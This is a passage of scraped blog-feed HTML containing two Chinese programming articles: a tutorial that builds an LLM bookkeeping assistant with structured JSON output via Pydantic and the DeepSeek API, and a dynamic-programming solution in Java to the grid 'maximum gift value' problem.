content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            春哥的Agent通关秘籍04：智能记账小秘书【实战篇】
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893870865303/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    摸鱼的春哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:16:08.000Z" title="Wed Feb 04 2026 00:16:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">春哥的Agent通关秘籍04：智能记账小秘书【实战篇】</h2>
<p><strong>这一章会有大段大段代码块，提前告知下，主要是解释demo的撰写思路，不讲解新知识。</strong></p>
<p>相关知识内容请看上一篇。</p>
<p>demo参考仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhangshichun%2Fai_agent_dev_study" target="_blank" title="https://github.com/zhangshichun/ai_agent_dev_study" ref="nofollow noopener noreferrer">github.com/zhangshichu…</a></p>
<p>这篇我们对格式化输出找一个简单但常见的场景进行实战。</p>
<p><img src="https://pic.zhangshichun.top/pic/20260204-1.gif" alt="" loading="lazy"/></p>
<p>目标：实现记账能力的AI助理，并且能反馈相关情绪</p>
<blockquote>
<p>用户输入：今天花xx钱买了个xx</p>
</blockquote>
<blockquote>
<p>AI输出一段稳定的json对象，不仅能抽离出用户自然语言里的字段，情绪，还能给与反馈。</p>
</blockquote>
<p>有了上一节的知识补充，本节实战几乎没有阻碍。</p>
<h3 data-id="heading-1">01, 定义 JSON 对象获取Schema·</h3>
<p>首先安装 <code>pydantic</code>:</p>
<pre><code class="hljs language-bash" lang="bash">pip install pydantic
</code></pre>
<p>然后，在代码里可以这样创建一个 Pydantic 对象:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 引入 Pydantic 的核心组件</span>
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field

<span class="hljs-comment"># ==========================================</span>
<span class="hljs-comment"># 第一步：定义字段类型和描述</span>
<span class="hljs-comment"># ==========================================</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AccountItem</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    amount: <span class="hljs-built_in">float</span> = Field(description=<span class="hljs-string">"交易金额，必须是数字。如果未提及金额，默认为 0.0"</span>)
    category: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"交易分类，只能从以下选择：[餐饮, 交通, 购物, 娱乐, 居家, 医疗, 学习, 其他]"</span>)
    product: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"具体的商品或服务名称"</span>)
    sentiment: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"消费时的情绪，例如：开心, 后悔, 心疼, 期待, 平淡 等等，可以自行总结"</span>)
    <span class="hljs-comment"># 🔥 新增字段：AI 的情感反馈</span>
    ai_comment: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"根据用户的消费内容和情绪，给出一句简短的反馈。如果是乱花钱可以幽默吐槽，如果是必要消费给予肯定，如果是心情不好则给予安慰。"</span>)

</code></pre>
<p>这一步我们首先明确了我们接下来希望从 LLM 那里得到什么样的数据：</p>
<ul>
<li>amount</li>
<li>category</li>
<li>product</li>
<li>sentiment 情绪</li>
<li>ai_comment AI评论</li>
</ul>
<p>接下来，我们可以调用API轻松地把以上定义转换为标准的 JSONSchema。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 把 Pydantic 类转换成 AI 能读懂的 JSON Schema 描述</span>
<span class="hljs-comment"># ensure_ascii=False 是为了让中文正常显示，不变成 \uXXXX</span>
schema_str = json.dumps(AccountItem.model_json_schema(), ensure_ascii=<span class="hljs-literal">False</span>)
</code></pre>
<h3 data-id="heading-2">02,组装完整的System Prompt</h3>
<p>上节我们说过，【系统提示词】是开发人员设置的静态的，高权重的提示词。</p>
<p>因此，在这里，我们需要明确：</p>
<ul>
<li>AI 在扮演什么角色</li>
<li>需要完成什么任务</li>
<li>遵循什么样的规则和要求</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 2. 构建 System Prompt</span>
    system_prompt = <span class="hljs-string">f"""
    你是一个不仅会记账，还很懂心理学的贴心助手。
    请分析用户的输入，提取关键信息，并给出情感反馈。
    
    【重要规则】
    1. 根据常识自动推断分类。
    2. 严格按照以下 JSON Schema 格式输出 JSON 数据，禁止包含 markdown：
    <span class="hljs-subst">{schema_str}</span>
    """</span>
</code></pre>
<h3 data-id="heading-3">03. 创建 client和会话</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

<span class="hljs-comment"># 加载环境变量</span>
load_dotenv()
<span class="hljs-comment"># 创建client</span>
client = OpenAI(
    api_key=os.getenv(<span class="hljs-string">"DEEP_SEEK_API_KEY"</span>), 
    base_url=os.getenv(<span class="hljs-string">"DEEP_SEEK_API_URL"</span>)
)
</code></pre>
<p>然后利用我们前几步构建好的参数和client来发起会话。</p>
<pre><code class="hljs language-python" lang="python">  <span class="hljs-comment"># 3. 调用大模型</span>
  response = client.chat.completions.create(
      model=<span class="hljs-string">"deepseek-chat"</span>, 
      messages=[
          {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: system_prompt}, <span class="hljs-comment"># 注入规则</span>
          {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: user_input}       <span class="hljs-comment"># 注入数据</span>
      ],
      <span class="hljs-comment"># 【关键】强制模型进入 JSON 模式，防止它胡乱说话</span>
      response_format={<span class="hljs-string">"type"</span>: <span class="hljs-string">"json_object"</span>} 
  )

  <span class="hljs-comment"># 4. 获取结果字符串</span>
  json_str = response.choices[<span class="hljs-number">0</span>].message.content
  
  <span class="hljs-comment"># 5. 【验证】将 JSON 字符串倒回 Pydantic 对象</span>
  data = json.loads(json_str)
  result = AccountItem(**data)
</code></pre>
<p>这里需要注意 <code>AccountItem(**data)</code> 这一步，如果返回的对象反序列化后，不符合最初设计的 JSON Schema格式，它就会报错，从而阻断脏数据等。</p>
<h3 data-id="heading-4">04. 动态获取cli的用户输入</h3>
<p>在 python 里，这非常容易：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 获取用户输入</span>
user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">"\n📝 请输入账单描述: "</span>).strip()
</code></pre>
<p>上节课我们怎么说的来着？用户输入最好作为 <code>User Prompt</code>，没错，把它动态传入作为 <code>User Prompt</code> 进行会话即可。</p>
<h3 data-id="heading-5">05. 测试代码</h3>
<p>完整代码可以参考demo工程里的文件：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhangshichun%2Fai_agent_dev_study%2Fblob%2Fmaster%2Flesson_04%2Flesson_04_structure.py" target="_blank" title="https://github.com/zhangshichun/ai_agent_dev_study/blob/master/lesson_04/lesson_04_structure.py" ref="nofollow noopener noreferrer">github.com/zhangshichu…</a></p>
<p>尝试运行代码：</p>
<pre><code class="hljs language-bash" lang="bash">python .\lesson_04\lesson_04_structure.py
</code></pre>
<p><img src="https://pic.zhangshichun.top/pic/20260204-1.gif" alt="" loading="lazy"/></p>
<p>如果把这个代码组装到一个 web server 上，那就能实现和前端的通信了。</p>
<h3 data-id="heading-6">下一步预告</h3>
<p>有了本节和上节的【结构化】输出，我们成功做到了可以准确让AI输出我们需要的结构化数据。</p>
<p>但，这实际上是最简单的一次性对话，根本不能代表AI Agent的核心场景。</p>
<p>但AI还有一些致命的弱点：</p>
<ul>
<li>不擅长算数</li>
<li>训练集不是实时的，无法知道今天的天气怎么样，现在几点等</li>
<li>没有记忆</li>
</ul>
<p>下节课开始，让我们开始着手解决这些问题。</p>
<p>敬请期待！</p>
<p><img src="https://pic.zhangshichun.top/pic/ScreenShot_2026-01-26_082327_821.png" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[剑指offer-72、礼物的最⼤价值]]></title>    <link>https://juejin.cn/post/7602463463106068526</link>    <guid>https://juejin.cn/post/7602463463106068526</guid>    <pubDate>2026-02-04T00:23:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463106068526" data-draft-id="7601169987411525670" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 剑指offer-72、礼物的最⼤价值"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2026-02-04T00:23:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SevenCoding"/> <meta itemprop="url" content="https://juejin.cn/user/3261615728242467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             剑指offer-72、礼物的最⼤价值
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3261615728242467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SevenCoding
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:23:55.000Z" title="Wed Feb 04 2026 00:23:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">题⽬描述</h2>
<p>在⼀个m × n的棋盘的每⼀格都放有⼀个礼物，每个礼物都有⼀定的价值（价值⼤于 0）。你可以从棋盘的左上⻆开始拿格⼦⾥的礼物，并每次向右或者向下移动⼀格、直到到达棋盘的右下⻆。给定⼀个棋盘及其上⾯的礼物的价值，请计算你最多能拿到多少价值的礼物？</p>
<p>如输⼊这样的⼀个⼆维数组，</p>
<pre><code class="hljs language-txet" lang="txet">[
[1,3,1],
[1,5,1],
[4,2,1]
]
</code></pre>
<p>那么路径 1→3→5→2→1 可以拿到最多价值的礼物，价值为 12</p>
<h2 data-id="heading-1">思路及解答</h2>
<h3 data-id="heading-2">基础动态规划</h3>
<p>这道题其实⼀看就知道是动态规划，棋盘中的每个⼩格⼦，都是和上⽅，或者左⽅的格⼦有关。既然是动态规划，那么我们先定义状态：</p>
<p><code>dp[i][j]</code>表示到达(i,j)位置时能获得的最大礼物价值</p>
<p>状态转移：<code>dp[i][j] = max(dp[i-1][j], dp[i][j-1]) + grid[i][j]</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    <span class="hljs-type">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[m][n];
    
    <span class="hljs-comment">// 初始化起点</span>
    dp[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
    
    <span class="hljs-comment">// 初始化第一行：只能从左边来</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        dp[<span class="hljs-number">0</span>][j] = dp[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>] + grid[<span class="hljs-number">0</span>][j];
    }
    
    <span class="hljs-comment">// 初始化第一列：只能从上边来</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        dp[i][<span class="hljs-number">0</span>] = dp[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + grid[i][<span class="hljs-number">0</span>];
    }
    
    <span class="hljs-comment">// 填充其余位置</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            dp[i][j] = Math.max(dp[i-<span class="hljs-number">1</span>][j], dp[i][j-<span class="hljs-number">1</span>]) + grid[i][j];
        }
    }
    
    <span class="hljs-keyword">return</span> dp[m-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>];
}
</code></pre>
<p>每个位置的计算只依赖左边和上边的结果，通过双重循环自左上向右下填充整个dp表</p>
<ul>
<li>时间复杂度：O(mn)</li>
<li>空间复杂度：O(mn)</li>
</ul>
<h3 data-id="heading-3">空间优化动态规划</h3>
<p>观察发现当前行只依赖上一行，可以使用一维数组进行空间优化，利用<code>dp[j]</code>在更新前存储上一行第j列的值，更新后存储当前行第j列的值，实现空间复用</p>
<p><code>dp[j]</code>表示当前行第j列的最大价值，滚动更新</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    <span class="hljs-type">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];
    
    <span class="hljs-comment">// 初始化第一行</span>
    dp[<span class="hljs-number">0</span>] = grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        dp[j] = dp[j-<span class="hljs-number">1</span>] + grid[<span class="hljs-number">0</span>][j];
    }
    
    <span class="hljs-comment">// 处理后续行</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-comment">// 更新第一列</span>
        dp[<span class="hljs-number">0</span>] += grid[i][<span class="hljs-number">0</span>];
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            <span class="hljs-comment">// dp[j]代表上一行第j列的值（从上方来）</span>
            <span class="hljs-comment">// dp[j-1]代表当前行第j-1列的值（从左边来）</span>
            dp[j] = Math.max(dp[j], dp[j-<span class="hljs-number">1</span>]) + grid[i][j];
        }
    }
    
    <span class="hljs-keyword">return</span> dp[n-<span class="hljs-number">1</span>];
}
</code></pre>
<ul>
<li>时间复杂度：O(mn)</li>
<li>空间复杂度：O(n)</li>
</ul>
<h3 data-id="heading-4">原地修改动态规划（最优解）</h3>
<p>修改原数组，直接使用grid数组作为dp表，避免额外空间分配</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] grid)</span> {
    <span class="hljs-keyword">if</span> (grid == <span class="hljs-literal">null</span> || grid.length == <span class="hljs-number">0</span> || grid[<span class="hljs-number">0</span>].length == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> grid.length, n = grid[<span class="hljs-number">0</span>].length;
    
    <span class="hljs-comment">// 初始化第一行</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
        grid[<span class="hljs-number">0</span>][j] += grid[<span class="hljs-number">0</span>][j-<span class="hljs-number">1</span>];
    }
    
    <span class="hljs-comment">// 初始化第一列</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        grid[i][<span class="hljs-number">0</span>] += grid[i-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];
    }
    
    <span class="hljs-comment">// 填充其余位置</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; m; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; j &lt; n; j++) {
            grid[i][j] += Math.max(grid[i-<span class="hljs-number">1</span>][j], grid[i][j-<span class="hljs-number">1</span>]);
        }
    }
    
    <span class="hljs-keyword">return</span> grid[m-<span class="hljs-number">1</span>][n-<span class="hljs-number">1</span>];
}
</code></pre>
<ul>
<li>时间复杂度： O(nm) ，需要计算完⾥⾯的⼩格⼦</li>
<li>空间复杂度： O(1) ，优化后可以实现原地操作，不需要额外的空间</li>
